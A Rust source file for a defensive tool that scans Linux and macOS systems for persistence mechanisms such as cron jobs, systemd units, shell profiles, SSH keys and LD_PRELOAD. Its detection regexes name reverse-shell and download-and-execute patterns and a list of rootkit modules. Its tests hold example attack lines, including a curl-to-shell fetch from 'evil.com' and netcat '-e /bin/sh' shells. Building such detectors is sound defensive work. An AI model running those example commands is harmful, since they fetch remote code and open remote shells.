//! # RT05 Persistence Check
//!
//! A comprehensive persistence mechanism detection tool for authorized security
//! assessments. This tool scans common persistence locations on Linux and macOS
//! systems to identify potential backdoors, malware persistence, or unauthorized
//! modifications.
//!
//! ## Legal Disclaimer
//!
//! THIS TOOL IS PROVIDED FOR AUTHORIZED SECURITY TESTING ONLY.
//! Scanning systems without authorization is illegal. This tool should only
//! be used during authorized security assessments or on systems you own.
//! The authors assume no liability for misuse.
//!
//! ## Persistence Locations Checked
//!
//! - Cron jobs (system and user)
//! - Systemd services and timers
//! - Init scripts (SysV, rc.local)
//! - Shell profiles and rc files
//! - SSH authorized_keys
//! - At jobs
//! - Kernel modules
//! - LD_PRELOAD configurations
//! - SUID/SGID binaries (modified)
//! - User login/logout scripts
//!
//! ## Usage Examples
//!
//! ```bash
//! # Full system scan (requires root)
//! sudo persist-check --full-scan
//!
//! # Scan specific user's persistence
//! persist-check --user john
//!
//! # Output to JSON file
//! persist-check --full-scan -o persistence_report.json
//! ```

use anyhow::{Context, Result};
use chrono::{DateTime, Local, TimeZone, Utc};
use clap::Parser;
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Write};
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};
use std::process::Command;
use walkdir::WalkDir;

// ============================================================================
// LEGAL DISCLAIMER
// ============================================================================

const LEGAL_DISCLAIMER: &str = r#"
╔══════════════════════════════════════════════════════════════════════════════╗
║                           LEGAL DISCLAIMER                                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This tool is provided for AUTHORIZED SECURITY ASSESSMENTS ONLY.             ║
║                                                                              ║
║  By using this tool, you acknowledge that:                                   ║
║  1. You have explicit written authorization to scan this system              ║
║  2. Unauthorized system scanning is a criminal offense                       ║
║  3. You accept full responsibility for your actions                          ║
║  4. The authors are not liable for any misuse or damage caused               ║
║                                                                              ║
║  This tool is designed for:                                                  ║
║  - Incident response investigations                                          ║
║  - Authorized penetration testing                                            ║
║  - System hardening assessments                                              ║
║  - Malware analysis on isolated systems                                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"#;

// ============================================================================
// COMMAND LINE INTERFACE
// ============================================================================

/// Persistence Mechanism Checker for Authorized Security Assessments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Perform full system scan (requires root)
    #[arg(long)]
    full_scan: bool,

    /// Scan specific user
    #[arg(long)]
    user: Option<String>,

    /// Output file for JSON results
    #[arg(short, long)]
    output: Option<PathBuf>,

    /// Skip legal disclaimer
    #[arg(long)]
    accept_disclaimer: bool,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,

    /// Include file contents in output
    #[arg(long)]
    include_contents: bool,

    /// Check for recently modified files (within N days)
    #[arg(long, default_value = "7")]
    recent_days: u32,

    /// Skip SUID/SGID binary scan (can be slow)
    #[arg(long)]
    skip_suid: bool,
}

// ============================================================================
// DATA STRUCTURES
// ============================================================================

/// Represents a detected persistence mechanism
#[derive(Debug, Clone, Serialize, Deserialize)]
struct PersistenceItem {
    /// Type of persistence mechanism
    mechanism_type: String,
    /// Location (file path or other identifier)
    location: String,
    /// Description of what was found
    description: String,
    /// Risk level (high, medium, low, informational)
    risk_level: String,
    /// Last modified timestamp
    modified: Option<String>,
    /// File owner
    owner: Option<String>,
    /// Relevant content snippet
    content_snippet: Option<String>,
    /// Whether this is a known system file
    is_system: bool,
    /// Recommendations
    recommendation: String,
}

/// Scan results
#[derive(Debug, Serialize, Deserialize)]
struct PersistenceReport {
    /// Scan timestamp
    timestamp: String,
    /// Hostname
    hostname: String,
    /// Current user
    current_user: String,
    /// Running as root
    is_root: bool,
    /// Total items found
    total_items: usize,
    /// Items by risk level
    risk_summary: HashMap<String, usize>,
    /// All persistence items
    items: Vec<PersistenceItem>,
}

/// Known persistence locations
struct PersistenceLocations {
    /// Cron directories
    cron_dirs: Vec<PathBuf>,
    /// User crontab location
    user_crontab: PathBuf,
    /// Systemd directories
    systemd_dirs: Vec<PathBuf>,
    /// Init script directories
    init_dirs: Vec<PathBuf>,
    /// Profile/RC files
    profile_files: Vec<PathBuf>,
    /// SSH directories
    ssh_dirs: Vec<PathBuf>,
}

impl Default for PersistenceLocations {
    fn default() -> Self {
        Self {
            cron_dirs: vec![
                PathBuf::from("/etc/cron.d"),
                PathBuf::from("/etc/cron.daily"),
                PathBuf::from("/etc/cron.hourly"),
                PathBuf::from("/etc/cron.weekly"),
                PathBuf::from("/etc/cron.monthly"),
                PathBuf::from("/var/spool/cron"),
                PathBuf::from("/var/spool/cron/crontabs"),
            ],
            user_crontab: PathBuf::from("/var/spool/cron/crontabs"),
            systemd_dirs: vec![
                PathBuf::from("/etc/systemd/system"),
                PathBuf::from("/lib/systemd/system"),
                PathBuf::from("/usr/lib/systemd/system"),
            ],
            init_dirs: vec![
                PathBuf::from("/etc/init.d"),
                PathBuf::from("/etc/init"),
                PathBuf::from("/etc/rc.local"),
                PathBuf::from("/etc/rc.d"),
            ],
            profile_files: vec![
                PathBuf::from("/etc/profile"),
                PathBuf::from("/etc/profile.d"),
                PathBuf::from("/etc/bash.bashrc"),
                PathBuf::from("/etc/bashrc"),
                PathBuf::from("/etc/zsh/zshrc"),
            ],
            ssh_dirs: vec![
                PathBuf::from("/etc/ssh"),
            ],
        }
    }
}

// ============================================================================
// PERSISTENCE SCANNER
// ============================================================================

/// Main persistence scanning functionality
struct PersistenceScanner {
    locations: PersistenceLocations,
    config: ScanConfig,
    items: Vec<PersistenceItem>,
}

/// Scanner configuration
struct ScanConfig {
    verbose: bool,
    include_contents: bool,
    recent_days: u32,
    full_scan: bool,
    target_user: Option<String>,
    skip_suid: bool,
}

impl PersistenceScanner {
    fn new(config: ScanConfig) -> Self {
        Self {
            locations: PersistenceLocations::default(),
            config,
            items: Vec::new(),
        }
    }

    /// Run all persistence checks
    fn run_all_checks(&mut self) -> Result<()> {
        println!("{} Starting persistence scan...\n", "[*]".blue());

        // Cron jobs
        self.check_cron_jobs()?;

        // Systemd services
        self.check_systemd_services()?;

        // Init scripts
        self.check_init_scripts()?;

        // Shell profiles
        self.check_shell_profiles()?;

        // SSH authorized keys
        self.check_ssh_keys()?;

        // At jobs
        self.check_at_jobs()?;

        // LD_PRELOAD
        self.check_ld_preload()?;

        // Kernel modules
        if self.config.full_scan {
            self.check_kernel_modules()?;
        }

        // SUID/SGID binaries
        if self.config.full_scan && !self.config.skip_suid {
            self.check_suid_binaries()?;
        }

        // User-specific checks
        if let Some(user) = &self.config.target_user {
            self.check_user_persistence(user)?;
        } else {
            // Check current user
            if let Ok(user) = std::env::var("USER") {
                self.check_user_persistence(&user)?;
            }
        }

        // PAM modules
        self.check_pam_modules()?;

        // Motd and login scripts
        self.check_login_scripts()?;

        // Environment files
        self.check_environment_files()?;

        Ok(())
    }

    /// Check cron jobs for suspicious entries
    fn check_cron_jobs(&mut self) -> Result<()> {
        println!("{} Checking cron jobs...", "[*]".blue());

        // Check system crontab
        self.check_file_for_persistence(
            Path::new("/etc/crontab"),
            "cron_system",
            "System crontab",
        )?;

        // Check cron directories
        for dir in &self.locations.cron_dirs {
            if dir.exists() {
                self.scan_directory(dir, "cron_directory")?;
            }
        }

        // Check user crontabs
        if self.locations.user_crontab.exists() {
            self.scan_directory(&self.locations.user_crontab, "user_crontab")?;
        }

        Ok(())
    }

    /// Check systemd services and timers
    fn check_systemd_services(&mut self) -> Result<()> {
        println!("{} Checking systemd services...", "[*]".blue());

        for dir in &self.locations.systemd_dirs {
            if !dir.exists() {
                continue;
            }

            for entry in WalkDir::new(dir).max_depth(2).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path();

                if path.is_file() {
                    let filename = path.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("");

                    // Check for service or timer files
                    if filename.ends_with(".service") || filename.ends_with(".timer") {
                        self.analyze_systemd_unit(path)?;
                    }
                }
            }
        }

        // Check user systemd services
        if let Some(home) = dirs::home_dir() {
            let user_systemd = home.join(".config/systemd/user");
            if user_systemd.exists() {
                self.scan_directory(&user_systemd, "user_systemd")?;
            }
        }

        Ok(())
    }

    /// Analyze a systemd unit file
    fn analyze_systemd_unit(&mut self, path: &Path) -> Result<()> {
        let content = match fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => return Ok(()),
        };

        // Check for suspicious patterns
        let suspicious_patterns = [
            (r"ExecStart.*(/tmp|/dev/shm|/var/tmp)", "Execution from temporary directory"),
            (r"ExecStart.*/bin/(bash|sh|nc|ncat|netcat)", "Shell or netcat execution"),
            (r"ExecStart.*curl|wget.*\|.*sh", "Download and execute pattern"),
            (r"ExecStart.*base64.*-d", "Base64 decoding in execution"),
            (r"OnBootSec=\d+s", "Service starts shortly after boot"),
            (r"WantedBy=.*multi-user", "Enabled for multi-user target"),
        ];

        let mut is_suspicious = false;
        let mut matched_patterns = Vec::new();

        for (pattern, description) in suspicious_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                if regex.is_match(&content) {
                    is_suspicious = true;
                    matched_patterns.push(description);
                }
            }
        }

        // Check modification time
        let metadata = fs::metadata(path)?;
        let modified = metadata.modified().ok()
            .map(|t| DateTime::<Utc>::from(t).format("%Y-%m-%d %H:%M:%S").to_string());

        let is_recent = self.is_recently_modified(path)?;

        // Add item if suspicious or recently modified
        if is_suspicious || is_recent {
            let risk = if is_suspicious { "high" } else { "medium" };
            let desc = if matched_patterns.is_empty() {
                "Recently modified systemd unit".to_string()
            } else {
                format!("Suspicious patterns: {}", matched_patterns.join(", "))
            };

            self.add_item(
                "systemd_service",
                path,
                &desc,
                risk,
                modified,
                Some(&content),
                false,
                "Review service configuration and verify legitimacy",
            );
        }

        Ok(())
    }

    /// Check init scripts
    fn check_init_scripts(&mut self) -> Result<()> {
        println!("{} Checking init scripts...", "[*]".blue());

        // Check rc.local
        let rc_local = Path::new("/etc/rc.local");
        if rc_local.exists() {
            self.check_file_for_persistence(rc_local, "init_script", "rc.local startup script")?;
        }

        // Check init.d scripts
        for dir in &self.locations.init_dirs {
            if dir.is_dir() {
                self.scan_directory(dir, "init_script")?;
            }
        }

        Ok(())
    }

    /// Check shell profile files
    fn check_shell_profiles(&mut self) -> Result<()> {
        println!("{} Checking shell profiles...", "[*]".blue());

        // System-wide profiles
        for path in &self.locations.profile_files {
            if path.is_file() {
                self.check_file_for_persistence(path, "shell_profile", "System shell profile")?;
            } else if path.is_dir() {
                self.scan_directory(path, "shell_profile")?;
            }
        }

        Ok(())
    }

    /// Check SSH authorized_keys
    fn check_ssh_keys(&mut self) -> Result<()> {
        println!("{} Checking SSH authorized keys...", "[*]".blue());

        // System SSH config
        let ssh_config = Path::new("/etc/ssh/sshd_config");
        if ssh_config.exists() {
            self.check_file_for_persistence(
                ssh_config,
                "ssh_config",
                "SSH daemon configuration",
            )?;
        }

        // User SSH directories
        let passwd_path = Path::new("/etc/passwd");
        if passwd_path.exists() {
            if let Ok(content) = fs::read_to_string(passwd_path) {
                for line in content.lines() {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() >= 6 {
                        let home_dir = PathBuf::from(parts[5]);
                        let auth_keys = home_dir.join(".ssh/authorized_keys");
                        let auth_keys2 = home_dir.join(".ssh/authorized_keys2");

                        if auth_keys.exists() {
                            self.analyze_authorized_keys(&auth_keys, parts[0])?;
                        }
                        if auth_keys2.exists() {
                            self.analyze_authorized_keys(&auth_keys2, parts[0])?;
                        }
                    }
                }
            }
        }

        Ok(())
    }

    /// Analyze SSH authorized_keys file
    fn analyze_authorized_keys(&mut self, path: &Path, username: &str) -> Result<()> {
        let content = match fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => return Ok(()),
        };

        let mut key_count = 0;
        let mut has_command = false;
        let mut has_from = false;

        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }

            key_count += 1;

            // Check for command= option (can be used for persistence)
            if line.contains("command=") {
                has_command = true;
            }

            // Check for from= restriction
            if line.contains("from=") {
                has_from = true;
            }
        }

        if key_count > 0 {
            let risk = if has_command { "high" } else { "informational" };
            let desc = format!(
                "{} SSH key(s) for user '{}'{}{}",
                key_count,
                username,
                if has_command { " (with command=)" } else { "" },
                if has_from { " (with from= restriction)" } else { "" }
            );

            let modified = fs::metadata(path).ok()
                .and_then(|m| m.modified().ok())
                .map(|t| DateTime::<Utc>::from(t).format("%Y-%m-%d %H:%M:%S").to_string());

            self.add_item(
                "ssh_authorized_keys",
                path,
                &desc,
                risk,
                modified,
                if self.config.include_contents { Some(&content) } else { None },
                false,
                if has_command {
                    "Review command= options in authorized_keys"
                } else {
                    "Verify all SSH keys are authorized"
                },
            );
        }

        Ok(())
    }

    /// Check at jobs
    fn check_at_jobs(&mut self) -> Result<()> {
        println!("{} Checking at jobs...", "[*]".blue());

        let at_dirs = ["/var/spool/at", "/var/spool/cron/atjobs"];

        for dir in at_dirs {
            let path = Path::new(dir);
            if path.exists() {
                self.scan_directory(path, "at_job")?;
            }
        }

        // Check using atq command
        if let Ok(output) = Command::new("atq").output() {
            if !output.stdout.is_empty() {
                let jobs = String::from_utf8_lossy(&output.stdout);
                if !jobs.trim().is_empty() {
                    self.add_item(
                        "at_job",
                        Path::new("/var/spool/at"),
                        &format!("Active at jobs:\n{}", jobs),
                        "medium",
                        None,
                        None,
                        false,
                        "Review scheduled at jobs",
                    );
                }
            }
        }

        Ok(())
    }

    /// Check LD_PRELOAD configurations
    fn check_ld_preload(&mut self) -> Result<()> {
        println!("{} Checking LD_PRELOAD configurations...", "[*]".blue());

        // Check /etc/ld.so.preload
        let preload_path = Path::new("/etc/ld.so.preload");
        if preload_path.exists() {
            let content = fs::read_to_string(preload_path)?;
            if !content.trim().is_empty() {
                self.add_item(
                    "ld_preload",
                    preload_path,
                    "LD_PRELOAD libraries configured",
                    "high",
                    None,
                    Some(&content),
                    false,
                    "Verify all preloaded libraries are legitimate",
                );
            }
        }

        // Check ld.so.conf.d
        let ld_conf_d = Path::new("/etc/ld.so.conf.d");
        if ld_conf_d.exists() {
            self.scan_directory(ld_conf_d, "ld_config")?;
        }

        Ok(())
    }

    /// Check kernel modules
    fn check_kernel_modules(&mut self) -> Result<()> {
        println!("{} Checking kernel modules...", "[*]".blue());

        // List loaded modules
        if let Ok(output) = Command::new("lsmod").output() {
            let modules = String::from_utf8_lossy(&output.stdout);

            // Check for suspicious module names
            let suspicious_modules = [
                "rootkit", "hide", "stealth", "invisible", "diamorphine",
                "reptile", "suterusu", "adore", "knark", "rial",
            ];

            for line in modules.lines() {
                let module_name = line.split_whitespace().next().unwrap_or("");
                for sus in suspicious_modules {
                    if module_name.to_lowercase().contains(sus) {
                        self.add_item(
                            "kernel_module",
                            Path::new("/proc/modules"),
                            &format!("Suspicious kernel module: {}", module_name),
                            "high",
                            None,
                            None,
                            false,
                            "Investigate kernel module immediately",
                        );
                    }
                }
            }
        }

        // Check module loading configuration
        let module_configs = [
            "/etc/modules",
            "/etc/modules-load.d",
            "/etc/modprobe.d",
        ];

        for config in module_configs {
            let path = Path::new(config);
            if path.is_file() {
                self.check_file_for_persistence(path, "kernel_config", "Kernel module config")?;
            } else if path.is_dir() {
                self.scan_directory(path, "kernel_config")?;
            }
        }

        Ok(())
    }

    /// Check SUID/SGID binaries
    fn check_suid_binaries(&mut self) -> Result<()> {
        println!("{} Checking for unusual SUID/SGID binaries (this may take a while)...", "[*]".blue());

        // Known legitimate SUID binaries
        let known_suid = [
            "/usr/bin/sudo", "/usr/bin/su", "/usr/bin/passwd", "/usr/bin/chsh",
            "/usr/bin/chfn", "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/mount",
            "/usr/bin/umount", "/usr/bin/ping", "/usr/bin/traceroute",
            "/usr/lib/openssh/ssh-keysign", "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
        ];

        // Search common binary locations
        let search_paths = ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"];

        for search_path in search_paths {
            let path = Path::new(search_path);
            if !path.exists() {
                continue;
            }

            for entry in WalkDir::new(path).max_depth(2).into_iter().filter_map(|e| e.ok()) {
                let file_path = entry.path();

                if !file_path.is_file() {
                    continue;
                }

                if let Ok(metadata) = fs::metadata(file_path) {
                    let mode = metadata.permissions().mode();

                    // Check for SUID (4000) or SGID (2000)
                    if mode & 0o4000 != 0 || mode & 0o2000 != 0 {
                        let file_str = file_path.to_string_lossy().to_string();

                        // Skip known binaries
                        if known_suid.contains(&file_str.as_str()) {
                            continue;
                        }

                        // Check if recently modified
                        let is_recent = self.is_recently_modified(file_path)?;

                        let suid_type = if mode & 0o4000 != 0 { "SUID" } else { "SGID" };

                        let modified = metadata.modified().ok()
                            .map(|t| DateTime::<Utc>::from(t).format("%Y-%m-%d %H:%M:%S").to_string());

                        let risk = if is_recent { "high" } else { "medium" };

                        self.add_item(
                            "suid_binary",
                            file_path,
                            &format!("{} binary: {:o}", suid_type, mode),
                            risk,
                            modified,
                            None,
                            false,
                            "Verify SUID/SGID binary is legitimate",
                        );
                    }
                }
            }
        }

        Ok(())
    }

    /// Check user-specific persistence
    fn check_user_persistence(&mut self, username: &str) -> Result<()> {
        println!("{} Checking user '{}' persistence...", "[*]".blue(), username);

        // Get user's home directory
        let home_dir = if let Some(home) = dirs::home_dir() {
            if username == std::env::var("USER").unwrap_or_default() {
                home
            } else {
                PathBuf::from(format!("/home/{}", username))
            }
        } else {
            PathBuf::from(format!("/home/{}", username))
        };

        if !home_dir.exists() {
            return Ok(());
        }

        // Shell RC files
        let rc_files = [
            ".bashrc", ".bash_profile", ".bash_login", ".bash_logout",
            ".profile", ".zshrc", ".zprofile", ".zlogin", ".zlogout",
            ".cshrc", ".tcshrc", ".kshrc",
        ];

        for rc_file in rc_files {
            let path = home_dir.join(rc_file);
            if path.exists() {
                self.check_file_for_persistence(&path, "user_shell_rc", &format!("User {} file", rc_file))?;
            }
        }

        // XDG autostart
        let autostart = home_dir.join(".config/autostart");
        if autostart.exists() {
            self.scan_directory(&autostart, "xdg_autostart")?;
        }

        // User crontab
        if let Ok(output) = Command::new("crontab").args(["-u", username, "-l"]).output() {
            if !output.stdout.is_empty() {
                let crontab = String::from_utf8_lossy(&output.stdout);
                if !crontab.contains("no crontab") {
                    self.add_item(
                        "user_crontab",
                        &home_dir.join(".crontab"),
                        &format!("User '{}' has crontab entries", username),
                        "informational",
                        None,
                        Some(&crontab),
                        false,
                        "Review user crontab entries",
                    );
                }
            }
        }

        Ok(())
    }

    /// Check PAM modules
    fn check_pam_modules(&mut self) -> Result<()> {
        println!("{} Checking PAM configuration...", "[*]".blue());

        let pam_dirs = ["/etc/pam.d", "/lib/security", "/lib64/security"];

        for dir in pam_dirs {
            let path = Path::new(dir);
            if path.exists() {
                self.scan_directory(path, "pam_config")?;
            }
        }

        Ok(())
    }

    /// Check login scripts
    fn check_login_scripts(&mut self) -> Result<()> {
        println!("{} Checking login/motd scripts...", "[*]".blue());

        let login_locations = [
            "/etc/update-motd.d",
            "/etc/motd",
            "/etc/issue",
            "/etc/issue.net",
        ];

        for location in login_locations {
            let path = Path::new(location);
            if path.is_file() {
                self.check_file_for_persistence(path, "login_script", "Login message/script")?;
            } else if path.is_dir() {
                self.scan_directory(path, "login_script")?;
            }
        }

        Ok(())
    }

    /// Check environment files
    fn check_environment_files(&mut self) -> Result<()> {
        println!("{} Checking environment files...", "[*]".blue());

        let env_files = [
            "/etc/environment",
            "/etc/default/locale",
            "/etc/security/pam_env.conf",
        ];

        for file in env_files {
            let path = Path::new(file);
            if path.exists() {
                self.check_file_for_persistence(path, "environment_file", "System environment")?;
            }
        }

        Ok(())
    }

    /// Helper: Scan a directory for persistence
    fn scan_directory(&mut self, dir: &Path, mechanism_type: &str) -> Result<()> {
        if !dir.exists() || !dir.is_dir() {
            return Ok(());
        }

        for entry in WalkDir::new(dir).max_depth(2).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() {
                self.check_file_for_persistence(path, mechanism_type, "")?;
            }
        }

        Ok(())
    }

    /// Helper: Check a file for suspicious content
    fn check_file_for_persistence(&mut self, path: &Path, mechanism_type: &str, description: &str) -> Result<()> {
        if self.config.verbose {
            println!("    {} Checking: {:?}", "[-]".dimmed(), path);
        }

        let content = match fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => return Ok(()), // Skip binary or unreadable files
        };

        // Check modification time
        let is_recent = self.is_recently_modified(path)?;
        let metadata = fs::metadata(path)?;
        let modified = metadata.modified().ok()
            .map(|t| DateTime::<Utc>::from(t).format("%Y-%m-%d %H:%M:%S").to_string());

        let owner = self.get_owner(path);

        // Suspicious patterns
        let suspicious_patterns = [
            (r"nc\s+-[el]|ncat|netcat.*-e", "Netcat listener/reverse shell"),
            (r"/dev/tcp/|/dev/udp/", "Bash TCP/UDP redirection"),
            (r"base64\s+-d|base64\s+--decode", "Base64 decoding"),
            (r"curl.*\|.*sh|wget.*\|.*sh", "Download and execute"),
            (r"python.*-c.*import.*socket", "Python socket code"),
            (r"perl.*-e.*socket", "Perl socket code"),
            (r"rm\s+-rf\s+/|rm\s+-rf\s+\*", "Destructive rm command"),
            (r"chmod\s+777|chmod\s+\+s", "Dangerous chmod"),
            (r"/tmp/\w+|/dev/shm/\w+", "Execution from temp directory"),
            (r"crontab\s+-r|crontab\s+-e", "Crontab modification"),
        ];

        let mut matches = Vec::new();
        for (pattern, desc) in suspicious_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                if regex.is_match(&content) {
                    matches.push(desc);
                }
            }
        }

        // Determine risk level
        let risk = if !matches.is_empty() {
            "high"
        } else if is_recent {
            "medium"
        } else {
            "informational"
        };

        // Only add if suspicious or recently modified
        if !matches.is_empty() || is_recent {
            let desc = if matches.is_empty() {
                if description.is_empty() {
                    format!("Recently modified {}", mechanism_type)
                } else {
                    description.to_string()
                }
            } else {
                format!("Suspicious patterns: {}", matches.join(", "))
            };

            self.add_item(
                mechanism_type,
                path,
                &desc,
                risk,
                modified,
                if self.config.include_contents { Some(&content) } else { None },
                false,
                if matches.is_empty() { "Review recent modifications" } else { "Investigate suspicious patterns" },
            );
        }

        Ok(())
    }

    /// Helper: Check if file was recently modified
    fn is_recently_modified(&self, path: &Path) -> Result<bool> {
        let metadata = fs::metadata(path)?;
        let modified = metadata.modified()?;
        let modified_time = DateTime::<Utc>::from(modified);
        let threshold = Utc::now() - chrono::Duration::days(self.config.recent_days as i64);

        Ok(modified_time > threshold)
    }

    /// Helper: Get file owner
    fn get_owner(&self, path: &Path) -> Option<String> {
        fs::metadata(path).ok().map(|m| {
            let uid = m.uid();
            // Try to resolve UID to username
            if let Ok(output) = Command::new("id").args(["-un", &uid.to_string()]).output() {
                String::from_utf8_lossy(&output.stdout).trim().to_string()
            } else {
                uid.to_string()
            }
        })
    }

    /// Add a persistence item
    fn add_item(
        &mut self,
        mechanism_type: &str,
        path: &Path,
        description: &str,
        risk_level: &str,
        modified: Option<String>,
        content: Option<&str>,
        is_system: bool,
        recommendation: &str,
    ) {
        let content_snippet = content.map(|c| {
            let lines: Vec<&str> = c.lines().take(10).collect();
            lines.join("\n")
        });

        self.items.push(PersistenceItem {
            mechanism_type: mechanism_type.to_string(),
            location: path.to_string_lossy().to_string(),
            description: description.to_string(),
            risk_level: risk_level.to_string(),
            modified,
            owner: self.get_owner(path),
            content_snippet,
            is_system,
            recommendation: recommendation.to_string(),
        });
    }

    /// Generate report
    fn generate_report(&self) -> PersistenceReport {
        let mut risk_summary: HashMap<String, usize> = HashMap::new();
        for item in &self.items {
            *risk_summary.entry(item.risk_level.clone()).or_insert(0) += 1;
        }

        let hostname = std::fs::read_to_string("/etc/hostname")
            .unwrap_or_else(|_| "unknown".to_string())
            .trim()
            .to_string();

        PersistenceReport {
            timestamp: Utc::now().to_rfc3339(),
            hostname,
            current_user: std::env::var("USER").unwrap_or_else(|_| "unknown".to_string()),
            is_root: nix::unistd::geteuid().is_root(),
            total_items: self.items.len(),
            risk_summary,
            items: self.items.clone(),
        }
    }
}

// ============================================================================
// OUTPUT FUNCTIONS
// ============================================================================

/// Display scan results
fn display_results(report: &PersistenceReport) {
    println!("\n{}", "═".repeat(80).cyan());
    println!("{}", " PERSISTENCE CHECK RESULTS ".cyan().bold());
    println!("{}", "═".repeat(80).cyan());

    println!("\n{}", "System Information:".white().bold());
    println!("    {} {}", "Hostname:".dimmed(), report.hostname);
    println!("    {} {}", "Current User:".dimmed(), report.current_user);
    println!("    {} {}", "Running as Root:".dimmed(), report.is_root);
    println!("    {} {}", "Scan Time:".dimmed(), report.timestamp);

    println!("\n{}", "Summary:".white().bold());
    println!("    {} {}", "Total Items Found:".dimmed(), report.total_items);

    for (risk, count) in &report.risk_summary {
        let risk_colored = match risk.as_str() {
            "high" => risk.red().bold(),
            "medium" => risk.yellow(),
            "low" => risk.green(),
            _ => risk.dimmed(),
        };
        println!("    {} {}: {}", "Risk Level".dimmed(), risk_colored, count);
    }

    // Display high-risk items
    let high_risk: Vec<_> = report.items.iter()
        .filter(|i| i.risk_level == "high")
        .collect();

    if !high_risk.is_empty() {
        println!("\n{} HIGH RISK ITEMS:", "[!]".red().bold());
        for item in high_risk {
            println!("\n    {} {}", "[HIGH]".red(), item.location.yellow());
            println!("        Type: {}", item.mechanism_type);
            println!("        Description: {}", item.description);
            if let Some(modified) = &item.modified {
                println!("        Modified: {}", modified);
            }
            if let Some(owner) = &item.owner {
                println!("        Owner: {}", owner);
            }
            println!("        {}: {}", "Action".cyan(), item.recommendation);
        }
    }

    // Display medium-risk items
    let medium_risk: Vec<_> = report.items.iter()
        .filter(|i| i.risk_level == "medium")
        .collect();

    if !medium_risk.is_empty() {
        println!("\n{} MEDIUM RISK ITEMS:", "[!]".yellow().bold());
        for item in medium_risk.iter().take(10) {
            println!("\n    {} {}", "[MED]".yellow(), item.location);
            println!("        Type: {}", item.mechanism_type);
            println!("        Description: {}", item.description);
        }
        if medium_risk.len() > 10 {
            println!("\n    ... and {} more medium-risk items", medium_risk.len() - 10);
        }
    }

    println!("\n{}", "═".repeat(80).cyan());
}

/// Save results to JSON file
fn save_results(report: &PersistenceReport, output: PathBuf) -> Result<()> {
    let mut file = File::create(&output)
        .with_context(|| format!("Failed to create output file: {:?}", output))?;

    let json = serde_json::to_string_pretty(report)?;
    file.write_all(json.as_bytes())?;

    println!("{} Results saved to {:?}", "[+]".green(), output);
    Ok(())
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

fn main() -> Result<()> {
    // Parse arguments
    let args = Args::parse();

    // Display legal disclaimer
    println!("{}", LEGAL_DISCLAIMER.red());

    if !args.accept_disclaimer {
        println!("{}", "Do you have authorization to scan this system? (yes/no): ".yellow());
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;

        if input.trim().to_lowercase() != "yes" {
            println!("{} Exiting - authorization required", "[!]".red());
            return Ok(());
        }
    }

    // Check if running as root for full scan
    if args.full_scan && !nix::unistd::geteuid().is_root() {
        println!("{} Warning: Full scan requires root privileges for complete results", "[!]".yellow());
    }

    println!("\n{}", "═".repeat(80).cyan());
    println!("{} Persistence Mechanism Check", " MODE:".cyan().bold());
    println!("{}", "═".repeat(80).cyan());

    // Create scanner
    let config = ScanConfig {
        verbose: args.verbose,
        include_contents: args.include_contents,
        recent_days: args.recent_days,
        full_scan: args.full_scan,
        target_user: args.user.clone(),
        skip_suid: args.skip_suid,
    };

    let mut scanner = PersistenceScanner::new(config);

    // Run all checks
    scanner.run_all_checks()?;

    // Generate and display report
    let report = scanner.generate_report();
    display_results(&report);

    // Save to file if requested
    if let Some(output) = args.output {
        save_results(&report, output)?;
    }

    println!("\n{} Persistence check complete!", "[+]".green().bold());

    Ok(())
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_persistence_locations() {
        let locations = PersistenceLocations::default();
        assert!(!locations.cron_dirs.is_empty());
        assert!(!locations.systemd_dirs.is_empty());
    }

    #[test]
    fn test_suspicious_pattern_detection() {
        let content = "curl http://evil.com/malware.sh | sh";
        let pattern = Regex::new(r"curl.*\|.*sh").unwrap();
        assert!(pattern.is_match(content));
    }

    #[test]
    fn test_netcat_pattern() {
        let patterns = [
            "nc -e /bin/sh",
            "ncat -l 4444",
            "netcat -lvp 4444 -e /bin/bash",
        ];
        let regex = Regex::new(r"nc\s+-[el]|ncat|netcat.*-e").unwrap();
        for pattern in patterns {
            assert!(regex.is_match(pattern), "Failed to match: {}", pattern);
        }
    }
}
